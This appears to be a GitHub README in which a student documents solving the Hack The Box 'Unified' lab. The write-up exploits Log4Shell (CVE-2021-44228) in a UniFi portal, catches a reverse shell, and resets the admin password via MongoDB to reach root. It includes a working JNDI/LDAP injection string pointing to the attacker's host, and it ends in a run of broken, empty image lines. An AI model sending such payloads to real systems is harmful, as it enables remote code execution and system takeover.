
# Unified Exploitation CVE-2021-44228 (Hack The Box)

## Project Summary

The engagement on the HackTheBox “Unified” box successfully exploited a critical Log4Shell vulnerability (CVE-2021-44228) in the UniFi network application. The penetration test progressed systematically from initial reconnaissance to ultimate root privilege escalation. First, the target’s network services were enumerated using standard scanning tools, revealing the UniFi portal (version 6.4.54) on port 8443. This outdated version was vulnerable to the Apache Log4j RCE flaw. By intercepting the UniFi login API request and injecting a crafted JNDI payload, a reverse shell was obtained via a malicious LDAP server. Post-exploitation included accessing the MongoDB instance, manipulating the administrator’s password hash, and logging in to retrieve the root SSH credentials. The result of the test was the capture of both the user and root flags, demonstrating full compromise of the system. Key tools and techniques included Nmap scanning, Burp Suite interception, a Rogue-JNDI payload server, and MongoDB command-line manipulation.

## Introduction and Objectives

This test aimed to evaluate the security of a UniFi network management appliance by exploiting known vulnerabilities and escalating privileges to full system control. UniFi is known to embed a Java Log4j component; versions around 6.4.54 were documented to be susceptible to CVE-2021-44228, a remote code execution flaw in log4j (the so-called “Log4Shell”). 

The attack plan was to:
1. Identify open services and the application version.
2. Confirm and exploit the Log4j vulnerability to gain an initial shell.
3. Perform post-exploitation steps to obtain administrator and then root access.

Specifically, after initial access, the goal was to leverage the embedded MongoDB database to reset the UniFi administrator password and extract the root SSH password from the web interface. Throughout the engagement, strict ethical hacking practices and a structured methodology were followed to achieve these objectives.

## Tools and Technologies Used

- **Nmap:** Network port scanner for service enumeration.
- **Burp Suite & FoxyProxy:** Interception and modification of HTTP(S) requests.
- **Wireshark & Tcpdump:** Network packet sniffer to monitor incoming connections.
- **OpenJDK & Maven:** Tools to compile and run the Rogue-JNDI application.
- **Rogue-JNDI:** Malicious LDAP server toolkit.
- **Netcat (nc):** Network utility to listen for reverse shell callbacks.
- **MongoDB Tools:** Manipulation of the UniFi MongoDB instance for user database modification.
- **SSH:** Secure Shell for root access.

## Step-by-Step Attack Path

1. **Verify Connectivity:**
   - Command: `ping 10.129.134.224`
   - Confirmed the target system was reachable.

2. **Port Scanning:**
   - Command: `nmap -sC -sV 10.129.134.224`
   - Identified open ports and services (22, 6789, 8080, 8443).

3. **Access UniFi Portal:**
   - Identified the UniFi web UI (version 6.4.54) on port 8443.

4. **Intercept Login Request:**
   - Captured the `/api/login` POST request using Burp Suite.

5. **Prepare JNDI Payload:**
   - Crafted a malicious JNDI LDAP payload to exploit Log4Shell.

6. **Monitor LDAP Traffic:**
   - Used `wireshark & tcpdump` to confirm LDAP callbacks from the target machine.

7. **Trigger the Payload:**
   - Delivered the crafted request to trigger JNDI injection.

8. **Prepare Exploit Environment:**
   - Installed Java tools and built Rogue-JNDI.

9. **Catch the Shell:**
   - Used Netcat to obtain a reverse shell.

10. **Stabilize Shell:**
    - Promoted the raw shell to a fully interactive bash shell.

11. **Identify MongoDB:**
    - Connected to the UniFi MongoDB instance and queried the admin database.

12. **Change Admin Password:**
    - Updated the admin password hash using the `mongo` CLI tool.

13. **Login as Administrator:**
    - Logged in to the UniFi web interface with the new credentials.

14. **Retrieve Root Password:**
    - Extracted the root password from the UniFi admin interface.

15. **Capture Root Flag:**
    - Used SSH to access the target as root and captured the root flag.

## Skills Demonstrated

- **Reconnaissance & Enumeration:** Network scanning and service fingerprinting.
- **Web Application Testing:** HTTP request interception and manipulation.
- **Vulnerability Exploitation:** Delivered a JNDI/LDAP payload to exploit CVE-2021-44228.
- **Custom Payload Development:** Built Rogue-JNDI for remote code execution.
- **Privilege Escalation:** Manipulated the MongoDB database to gain admin credentials.
- **Post-Exploitation:** Used tools like Netcat and SSH for shell access and system control.

## Project Summary and Key Takeaways

In conclusion, the UniFi box was successfully compromised end-to-end. By exploiting a known Log4j RCE vulnerability, the team gained an initial shell and then escalated privileges to obtain administrator and root credentials. Each stage – from scanning and exploiting to database manipulation – validated the importance of thorough methodology and tool proficiency. 

**Personal Insights and Professional Growth:** This exercise reinforced my understanding of the Log4Shell vulnerability and practical exploit development. It also honed skills in chaining attack phases (reconnaissance, exploitation, escalation) in a realistic scenario. The experience of building and using Rogue-JNDI deepened my appreciation for payload automation tools, and manipulating MongoDB underscored the power of database interactions in post-exploitation.

---

**References:**
- [CVE-2021-44228](https://nvd.nist.gov)
- [Nmap](https://nmap.org)
- [Burp Suite](https://portswigger.net/burp)
- [Rogue-JNDI GitHub Repository](https://github.com/veracode-research/rogue-jndi)

  ## Step-by-Step Demonstration of My Hands-On Work
  ## Step 1
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e52e68b128a620ed65c04738e21c73e58d3a7e63/1%20ping%20ip.png)
  ```bash
  ping 10.129.134.224
  ```
  ## Step 2
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/778ac82dd156826c4ef9ad9ad167e86214f4d7a3/2%20nmap%20to%20scan.png)
  ```bash
  nmap -sC -sV 10.129.134.224
  ```
  ## Step 3
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/a35ebba3cb73160c40a184fc0046186921c4c788/3%20burpsuite%20browser.png)
  # Burp Suite open in Kali Linux
  ## Step 4
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/c0a83c87026f32509d83b1156e472f22c04f6d2b/4%20unified%20with%20version%20.png)
  # Burp Suite web browser:
   ```bash
   https://10.129.134.224:8443/
   ```
   ## Step 5
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/acebcbb87264487110e7a17f327c3b31d5790e13/5%20unfied%20CVE%202021-44228.png)
  # CVE-2021-44228
  ## Step 6
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/ef90ff46fd5fe135296c98b162ec1954a9004633/6%20try%20to%20login%20deafult%20username%20and%20password%20but%20invalid%20usrname%20and%20password.png)
  # trying to log in default username and password
  ## Step 7
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/6bf1dea4ce7b369741163516e0f126623784c855/7%20intercept%20the%20trafic%20with%20burpsuite%20and%20api%20login.png)
  # intercepting the traffic
  ## Step 8
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/28f8cbcff80528874645a918c71e30663a51ad62/8%20right%20click%20api%20login%20to%20send%20to%20repeater.png)
  # Send to Repeater to get response
  ## Step 9
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/e22eb7b4b50e07b05d1ab07d99078ed088151630/9%20ifconfig%20to%20see%20tun0%20host%20ip.png)
  # Tun0 host IP
  ```bash
  ifconfig
  ```
  ## Step 10
  ### ![image_alt](https://github.com/bikasha49/HackTheBox-Unified-Tier-II-Challenge/blob/1709021dbb59ca2e4df1f5dee83879fd81083883/10%20change%20the%20payload%20with%20host%20tun0%20host%20ip%20to%20see%20from%20wireshark%20.png)
  # Changing the payload with Tun0 host IP in the remember section vulnerable parameter 
  ```bash
  "${jndi:ldap://10.10.16.87/whatever}",
  ```
  
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
  ### ![image_alt](
